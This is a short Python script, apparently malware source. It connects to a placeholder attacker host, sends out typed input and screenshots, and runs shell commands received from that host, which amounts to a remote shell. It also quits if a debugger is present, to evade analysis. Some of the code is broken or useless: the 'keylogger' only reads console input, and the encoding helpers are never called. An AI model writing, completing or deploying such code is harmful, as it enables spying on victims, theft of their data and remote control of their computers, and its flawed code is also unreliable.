import socket
import subprocess
import os
import threading
import time
import base64
import zlib
import ctypes

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("attacker_ip", 12345))
sock.send(b"Malware active")

def compress_and_encode(code):
    compressed_code = zlib.compress(code.encode('utf-8'))
    encoded_code = base64.b64encode(compressed_code)
    return encoded_code

def decompress_and_decode(encoded_code):
    compressed_code = base64.b64decode(encoded_code)
    code = zlib.decompress(compressed_code).decode('utf-8')
    return code

def keylogger():
    log_file = "keylog.txt"
    while True:
        keystroke = input()
        with open(log_file, "a") as f:
            f.write(keystroke + "\n")
        sock.send(keystroke.encode())

def screenshooter():
    while True:
        from PIL import ImageGrab
        img = ImageGrab.grab()
        img.save("screenshot.png")
        with open("screenshot.png", "rb") as f:
            sock.send(f.read())

def command_executor():
    while True:
        command = sock.recv(1024).decode()
        if command == "exit":
            sock.close()
            break
        output = subprocess.check_output(command, shell=True)
        sock.send(output)

keylog_thread = threading.Thread(target=keylogger)
screenshooter_thread = threading.Thread(target=screenshooter)
command_executor_thread = threading.Thread(target=command_executor)

keylog_thread.start()
screenshooter_thread.start()
command_executor_thread.start()

if ctypes.windll.kernel32.IsDebuggerPresent():
    sock.close()
    exit()

while True:
    time.sleep(1)
